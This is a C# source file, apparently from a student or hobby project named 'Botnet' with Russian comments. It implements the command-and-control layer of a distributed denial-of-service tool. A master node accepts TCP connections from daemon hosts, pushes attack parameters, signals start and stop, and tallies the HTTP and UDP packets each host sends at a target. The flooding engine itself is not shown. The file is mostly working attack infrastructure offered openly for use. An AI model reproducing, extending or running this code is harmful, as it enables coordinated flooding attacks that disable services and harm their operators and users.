using System;
using System.Collections.Generic;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Threading;

namespace Botnet
{
    sealed public class NetworkController
    {
        private enum MessageCode : byte
        {
            Params,
            StartAttack,
            StopAttack,
            StatisticMessageRequest

        }
        /// <summary>
        /// Хост, учавствующий в атаке
        /// </summary>
        sealed public class Daemon
        {
            public int id;
            public UInt32 HttpCounter;
            public UInt32 UdpCounter;
            public TcpClient Client; 
            public ControllerState state;
            public Daemon(TcpClient handler, ControllerState curstate)
            {
                Client = handler;
                state = curstate;
            }
            public IPEndPoint RemoteIPEndPoint
            {
                get
                {
                    return (IPEndPoint)(Client.Client.RemoteEndPoint);
                }
            }
            public string GetId()
            {
                return RemoteIPEndPoint.ToString();
            }
            public override string ToString()
            {
                try
                {
                    IPEndPoint point = (IPEndPoint)(Client.Client.RemoteEndPoint);
                    return point.Address + " " + point.Port;
                }
                catch (ObjectDisposedException)
                {

                    return "Object Disposed";
                }
            }
        }
        /// <summary>
        /// Список хостов, учавствующих в атаке
        /// </summary>
        sealed public class DaemonPool : Dictionary<string, Daemon>
        {
            private UInt32 HttpCounter;
            private UInt32 UdpCounter;
            /// <summary>
            /// Добавляет новый хост в пул
            /// </summary>
            /// <param name="key">Ключ (ip+port) нового хоста</param>
            /// <param name="daemon">Новый хост/param>
            public new void Add(string key, Daemon daemon)
            {
               if(ContainsKey(key))
                {
                    Remove(key);
                }
                base.Add(key, daemon);
            }
            /// <summary>
            /// Добавляет новый хост в пул
            /// </summary>
            /// <param name="NewHost">Новый хост</param>
            public void Add(Daemon NewHost)
            {
                string key = NewHost.GetId();
                Add(key, NewHost);
            }
            /// <summary>
            /// Удаляет хост из пула
            /// </summary>
            /// <param name="Id">Id удаляемого хоста(ip+port)</param>
            public new void Remove(string Id)
            {
                if (ContainsKey(Id))
                {
                    this[Id].Client.GetStream().Close();
                    this[Id].Client.Close();
                    base.Remove(Id);
                }
            }
            /// <summary>
            /// Добавляет новые статистические данные хосту
            /// </summary>
            /// <param name="key">Id удаляемого хоста(ip+port)</param>
            /// <param name="dhttp">Количество новых пакетов, отправленных хостом с последнего запроса</param>
            /// <param name="dUdp">Количество новых пакетов, отправленных хостом с последнего запроса</param>
            public void addStat(string key, UInt32 dhttp, UInt32 dUdp)
            {
                if (ContainsKey(key))
                {
                    this[key].HttpCounter += dhttp;
                    this[key].UdpCounter += dUdp;
                    HttpCounter += dhttp;
                    UdpCounter += dUdp;
                }
            }
            public UInt32 getHostHttpStat(string key)
            {
                return this[key].HttpCounter;
            }
            public UInt32 getHostUdpStat(string key)
            {
                return this[key].UdpCounter;
            }
            public UInt32 getTotalHttp()
            {
                return HttpCounter;
            }
            public new void Clear()
            {
                base.Clear();
                HttpCounter = 0;
                UdpCounter = 0;
            }
            public UInt32 getTotalUdp()
            {
                return UdpCounter;
            }
        }

        /// <summary>
        /// Возвращает сообщения от Контроллера сети к пользователю
        /// </summary>
        private CallBackFunct UpdateData;
        /// <summary>
        /// Возвращает статистические данные пользователю
        /// </summary>
        private StatisticCallBack ProccessStatisticRespond;
        /// <summary>
        /// Возвращает пользователю сообщения об ошибках
        /// </summary>
        private ErrorCallBack ExErrorHandler;
        /// <summary>
        /// Список хостов, участвующих в атаке
        /// </summary>
        private DaemonPool Daemons;
        /// <summary>
        /// В режиме хоста, определяет сетевую точку, определяющую мастера атаки
        /// </summary>
        private IPEndPoint Master;
        /// <summary>
        /// Определяет локальную сетевую точку
        /// </summary>
        private IPEndPoint MyPoint;
        /// <summary>
        /// В режиме мастера, прослушивает новые TCP подключения
        /// </summary>
        private TcpListener Server;
        /// <summary>
        /// В режиме хоста, используется для коммуникации с мастером
        /// </summary>
        private TcpClient HostClient;
        /// <summary>
        /// Ядро, Осуществляет непосредственно саму атаку
        /// </summary>
        private AttackController Core;
        /// <summary>
        /// В режиме хоста, флаг определяет запущена ли мастером атака
        /// </summary>
        private volatile bool AttackIsAllowed;
        /// <summary>
        /// Определяет текущее состоянии контроллера сети
        /// </summary>
        private volatile ControllerState state;
        /// <summary>
        /// Начинает прослушивание новых TCP подключений
        /// </summary>
        private void InitServer()
        {
            state = ControllerState.Tuning;
            Server = new TcpListener(MyPoint);
            Daemons.Clear();
            Server.Start();
            Server.BeginAcceptTcpClient(new AsyncCallback(ClientOnTryConnect), Server);
        }
        /// <summary>
        /// Обрабатывает новый запрос на подключение, в случае успеха запускает поток для поддержания соединения с хостом
        /// </summary>
        /// <param name="res"></param>
        private void ClientOnTryConnect(IAsyncResult res)
        {
            try
            {
                TcpListener Server = res.AsyncState as TcpListener;  ///////1111!!!1
                TcpClient NewHost = Server.EndAcceptTcpClient(res);
                if (!Daemons.ContainsKey(((IPEndPoint)NewHost.Client.RemoteEndPoint).ToString()))
                {
                    Thread Handler = new Thread(new ParameterizedThreadStart(MaintainServerConnection));
                    Daemon NewDaemon = new Daemon(NewHost, ControllerState.Suspending);
                    Daemons.Add(NewDaemon);
                    Handler.Start(NewHost);
                }
                Server.BeginAcceptTcpClient(new AsyncCallback(ClientOnTryConnect), Server);
            }
            catch (ObjectDisposedException)
            {
                return;
            }
        }
        /// <summary>
        /// Метод, поддерживающий соединение мастера с хостом
        /// </summary>
        /// <param name="Params"></param>
        private void MaintainServerConnection(Object Params)
        {
            TcpClient Connection = Params as TcpClient;
            string key = ((IPEndPoint)(Connection.Client.RemoteEndPoint)).ToString();
            string hostname = Daemons[key].ToString(); 
            UpdateData(hostname + " Присоединился");   ///index!!!
            NetworkStream Stream = Connection.GetStream();
            Connection.ReceiveBufferSize = 1000;
            Connection.ReceiveTimeout = 200;
            byte[] buffer = new byte[9];
            try
            {
                while (Connection.Connected)
                {
                    if (Connection.Available >= 9)
                    {
                        Stream.Read(buffer, 0, 9);
                        UInt32 Http = BitConverter.ToUInt32(buffer, 1);
                        UInt32 Udp = BitConverter.ToUInt32(buffer, 5);
                        Daemons.addStat(key, Http, Udp);
                        ProccessStatisticRespond(Core.HttpCounter, Core.UdpCounter, Core.HttpCounter + Daemons.getTotalHttp(), Core.UdpCounter + Daemons.getTotalUdp());

                    }
                }
            }
            catch (ObjectDisposedException)
            {
                return;
            } 
            UpdateData(hostname + " Отсоединился");
            Daemons.Remove(key); 
        }
        /// <summary>
        /// ПОддерживает соединение хоста с мастером
        /// </summary>
        /// <param name="Params"></param>
        private void MaintaintHostConnection(Object Params)
        {
            TcpClient Connection = Params as TcpClient;
            try
            {
                Connection.Connect(Master);
                if (state != ControllerState.Suspending) state = ControllerState.Suspending;
                UpdateData("Соединение с мастером установлено");
                Connection.ReceiveBufferSize = 10000;
                Connection.ReceiveTimeout = 100;
                NetworkStream Stream = Connection.GetStream();
                bool DataCollected;
                UInt32 oldHttpCount = 0;
                UInt32 oldUdpCount = 0;
                UInt32 newHttpCount;
                UInt32 newUdpCount;
                while (Connection.Connected)
                {
                    DataCollected = false;
                    if (Connection.Available >= 1)
                    {
                        int code = Stream.ReadByte();
                        switch (code)
                        {
                            case 0:
                                while (Connection.Connected && !DataCollected)
                                {
                                    if (Connection.Available >= 2)
                                    {
                                        byte[] buuf = new byte[2];
                                        Stream.Read(buuf, 0, 2);                              //df to add length in sendservicemsg
                                        UInt16 len = BitConverter.ToUInt16(buuf, 0);
                                        while (Connection.Connected && !DataCollected)
                                        {
                                            if (Connection.Available >= len)
                                            {
                                                byte[] buffer = new byte[len];
                                                Stream.Read(buffer, 0, len);
                                                InitParams(AttackParams.parseFromArray(buffer));
                                                state = ControllerState.Suspending;
                                                DataCollected = true;
                                                UpdateData("Получены настройки от мастера");
                                            }
                                        }

                                    }
                                }
                                break;
                            case 1:
                                AttackIsAllowed = true;
                                Start(); break;
                            case 2:
                                AttackIsAllowed = false;
                                Stop(); break;
                            case 3:
                                List<byte> msgs = new List<byte>();
                                msgs.Add(3);
                                newHttpCount = Core.HttpCounter;
                                newUdpCount = Core.UdpCounter;
                                msgs.AddRange(BitConverter.GetBytes(newHttpCount - oldHttpCount));
                                msgs.AddRange(BitConverter.GetBytes(newUdpCount - oldUdpCount));
                                oldHttpCount = newHttpCount;
                                oldUdpCount = newUdpCount;
                                Stream.Write(msgs.ToArray(), 0, msgs.Count);
                                break;
                        }
                    }
                }
                UpdateData("Соединение с мастером разорвано");
            }
            catch (SocketException err)
            {
                UpdateData("Невозможно подключиться к мастеру"); //1060 exception
                state = ControllerState.Error;
            }
            catch (ObjectDisposedException)
            {
                return;
            }
        }
        /// <summary>
        /// Отправляет сообщение удаленному клиенту
        /// </summary>
        /// <param name="code">Код сообщения</param>
        /// <param name="Recipinet">Получатель</param>
        /// <param name="payload">Дополнительные параметры сообщения</param>
        private void SendServiceMessage(MessageCode code, TcpClient Recipinet, params byte[] payload)
        {
            List<byte> data = new List<byte>();
            data.Add((byte)code);
            if (payload.Length != 0)
            {
                data.AddRange(BitConverter.GetBytes((UInt16)payload.Length));
                data.AddRange(payload);
            }
            try
            {
                Recipinet.GetStream().Write(data.ToArray(), 0, data.Count);
            }
            catch (Exception)
            {  //host has disconnected
            }
        }
        /// <summary>
        /// Отправляет хостам, готовым к атаке, сигнал о начале атаки
        /// </summary>
        private void SendStartSignal()
        {
            foreach(Daemon host in Daemons.Values) //TODO: Возможно нужно заблокировать этот участок, писали что словарь не мультипоточный
            {
                if (host.state == ControllerState.Suspending)
                {
                    host.state = ControllerState.Attacking;
                    SendServiceMessage(MessageCode.Params, host.Client, Params.GetBytes());
                    SendServiceMessage(MessageCode.StartAttack, host.Client);

                }
            }
        }
        /// <summary>
        /// Отправляет хостам, выполняющим атаку, сигнал об окончании атаки
        /// </summary>
        private void SendStopSignal()
        {
            foreach (Daemon host in Daemons.Values) //need to lock this
            {
                if (host.state == ControllerState.Attacking)
                {
                    host.state = ControllerState.Suspending;
                    SendServiceMessage(MessageCode.StopAttack, host.Client);
                }
            }
        }
        /// <summary>
        /// Отправляет хостам, выполняющим атаку, запрос статистических данных
        /// </summary>
        private void SendStatReqSignal()
        {
            foreach (Daemon host in Daemons.Values) //need to lock this
            {
                if (host.state == ControllerState.Attacking)
                {
                    SendServiceMessage(MessageCode.StatisticMessageRequest, host.Client);
                }
            }
        }
        private void CoreErrorHandler(int errorcode, string message)  //0 socket error, 1 - cant reach the target
        {
            if (state != ControllerState.Suspending)
            {
                Stop();
            }
            ExErrorHandler(message);
        }
        public delegate void CallBackFunct(string Message);
        public delegate void ChangeModeCallBack(bool mode); //looks like its not needed
        public delegate void StatisticCallBack(UInt32 httpam, UInt32 udpam, UInt32 tothttp, UInt32 totudp);
        public delegate void ErrorCallBack(string message);
        public enum ControllerState : Byte
        {
            Suspending,
            Attacking,
            Tuning,
            Error,
        }
        /// <summary>
        /// Определяет режим работы контроллера
        /// </summary>
        public bool mode { get; private set; }

        /// <summary>
        /// Определяет текущий сетевой адаптер
        /// </summary>
        public NetworkInterface Adapter { get; private set; }

        /// <summary>
        /// Определяет текущий порт
        /// </summary>
        public int CurrentPort { get; set; }
        public IPEndPoint LocalIpEndPoint
        {
            get
            {
                return MyPoint;
            }
        }
        public IPEndPoint MasterIpEndPont
        {
            get
            {
                return Master;
            }
        }
        /// <summary>
        /// Возвращает установленные в данный момент параметры атаки
        /// </summary>
        public AttackParams Params
        {
            get
            {
                if (Core != null)
                {
                    return Core.Params;
                }
                else return new AttackParams();
            }
        }
        /// <summary>
        /// Флаг, показывающий выполняется ли атака в данный момент
        /// </summary>
        public bool isAttacking
        {
            get
            {
                if (state == ControllerState.Attacking)
                {
                    return true;
                }
                else return false;

            }
        }
        public NetworkController(AttackParams Params, NetworkInterface Adapter, CallBackFunct MessageCallBack, StatisticCallBack StatRespond, ErrorCallBack LostCOnnectionHandler, int alt_port, IPEndPoint MasterPoint) //master mode only
        {
            UpdateData = MessageCallBack;
            this.ProccessStatisticRespond = StatRespond;
            this.ExErrorHandler = LostCOnnectionHandler;
            //Daemons = new DaemonList();
            Daemons = new DaemonPool();
            state = ControllerState.Tuning;
            try
            {
                InitInterface(Adapter, alt_port, MasterPoint);
                InitParams(Params);
            }
            catch (Exception err)
            {
                state = ControllerState.Error;
            }
        }
        /// <summary>
        /// Инициализирует контроллер
        /// </summary>
        /// <param name="Adapter">Сетевой адаптер</param>
        /// <param name="al_port">Порт приложения</param>
        /// <param name="MasterPoint">Сетевая точка определяющая мастера, в случае режима мастера оставить null</param>
        public void InitInterface(NetworkInterface Adapter, int al_port, IPEndPoint MasterPoint)
        {
            if (state == ControllerState.Attacking)
            {
                Stop();
            }
            if ((al_port != CurrentPort) || (Adapter.Id != this.Adapter.Id) || ((MasterPoint != null) && (!MasterPoint.Equals(Master))) || ((MasterPoint == null) && (Master != null)))
            {
                Close();
                UpdateData("Инициализация клиентов");
                try
                {
                    CurrentPort = al_port;
                    MyPoint = new IPEndPoint(NetworkInstruments.getAdapterIPAddress(Adapter), CurrentPort);
                    this.Adapter = Adapter;
                    if (MasterPoint == null)
                    {
                        mode = true;
                        InitServer();
                        //ChangeMode(true);
                    }
                    else
                    {
                        Master = MasterPoint;
                        mode = false;
                        ConnectToMaster();
                    }
                }
                catch (SocketException err)
                {
                    state = ControllerState.Error;
                    if (err.SocketErrorCode == SocketError.AddressAlreadyInUse)
                    {
                        UpdateData("Выбранный порт занят");
                    }
                    if (err.ErrorCode == (int)SocketError.AddressNotAvailable)
                    {
                        UpdateData("Не найдено интерфейса с таким адресом");
                    }
                }
                catch (ObjectDisposedException) { return; }
            }
        }
        /// <summary>
        /// Инициализирует параетры атаки
        /// </summary>
        /// <param name="Params">Параметры</param>
        public void InitParams(AttackParams Params)
        {
            if (state != ControllerState.Error)
            {
                UpdateData("Применение параметров");
                if (state == ControllerState.Attacking)
                {
                    Stop();
                }
                state = ControllerState.Tuning;
                if (Core != null)
                {
                    Core.Params = Params;
                    Core.Adapter = Adapter;
                    Core.ResetCounters();
                }
                else
                    Core = new AttackController(Params, Adapter, CoreErrorHandler);
                if (mode)
                {
                    state = ControllerState.Suspending;
                }
            }
        }
        /// <summary>
        /// Выполняет подключение хоста к мастеру
        /// </summary>
        public void ConnectToMaster()
        {
            if (!mode)
            {
                if (state == ControllerState.Attacking) Stop();
                Close();
                AttackIsAllowed = false;
                state = ControllerState.Tuning;
                HostClient = new TcpClient(MyPoint);
                Thread ClientHandler = new Thread(new ParameterizedThreadStart(MaintaintHostConnection));
                ClientHandler.Start(HostClient);
            }
        }
        /// <summary>
        /// Запускает атаку
        /// </summary>
        public void Start()
        {
            if ((state != ControllerState.Error) && (state != ControllerState.Tuning))
            {
                if (!Core.State)
                {
                    if (mode)
                    {
                        SendStartSignal();
                        UpdateData("Начало атаки на " + Core.Params.Target.Address.ToString() + ":" + Core.Params.Target.Port);
                        Core.start();
                        state = ControllerState.Attacking;
                    }
                    else
                    {
                        if (AttackIsAllowed)
                        {
                            Core.start();
                            UpdateData("Начало атаки на" + Core.Params.Target.Address.ToString() + ":" + Core.Params.Target.Port);
                            state = ControllerState.Attacking;
                        }
                        else UpdateData("Атака еще не запущена мастером");
                    }

                }
                else
                {
                    UpdateData("Атака уже запущена");
                }
            }
            else
            {
                if (state == ControllerState.Error)
                {
                    if (!mode)
                    {
                        UpdateData("Отсутсвует подключение к мастеру");
                    }
                    else
                    {
                        UpdateData("выбранный порт занят");
                    }
                    //state = ControllerState.Error; 
                }
            }

        }
        /// <summary>
        /// Останавливает атаку
        /// </summary>
        public void Stop()
        {
            if (state == ControllerState.Attacking)
            {
                Core.stop();
                UpdateData("Остановка атаки...");
                if (mode)
                {
                    SendStopSignal();
                }
                state = ControllerState.Suspending;
            }
            else
            {
                UpdateData("Атака еще не запущена");
            }
        }
        /// <summary>
        /// Инициирует контроллер собрать все имеющиеся данные и вернуть их пользователю, обратным вызовом
        /// </summary>
        public void Statistic() //return amount of sent packets from each pc
        {
            if (mode)
            {
                if (Daemons.Count != 0)
                {
                    SendStatReqSignal();
                }
                else
                {
                    ProccessStatisticRespond(Core.HttpCounter, Core.UdpCounter, Core.HttpCounter, Core.UdpCounter);
                }
            }
            else
            {
                ProccessStatisticRespond(Core.HttpCounter, Core.UdpCounter, 0, 0);
            }
        }
        /// <summary>
        /// В режиме мастера возвращает список подключенных хостов
        /// </summary>
        /// <returns></returns>
        public string[] GetDaemonList()
        {
            if (!mode) throw new Exception(); //if daemon mode its invalid cast
            string[] info = new string[Daemons.Count];
            int i = 0;
            foreach(Daemon host in Daemons.Values)
            {
                info[i] = host.ToString();
                ++i;
            }
            return info;
            // return for each daemon to array();
        }
        /// <summary>
        /// Закрывает все соединения и завершает работу контроллера
        /// </summary>
        public void Close()
        {
            //close all connections
            if (mode)
            {
                if (Server != null)
                {
                    foreach(Daemon host in Daemons.Values)
                    {
                        host.Client.GetStream().Close();
                        host.Client.Close();
                    }
                    Daemons.Clear();
                    Server.Stop();
                }
            }
            else
            {
                if (HostClient != null)
                {
                    if ((HostClient.Client != null) && (HostClient.Connected))
                    {
                        HostClient.GetStream().Close();
                    }
                    HostClient.Close();
                }
            }
        }
    } 
}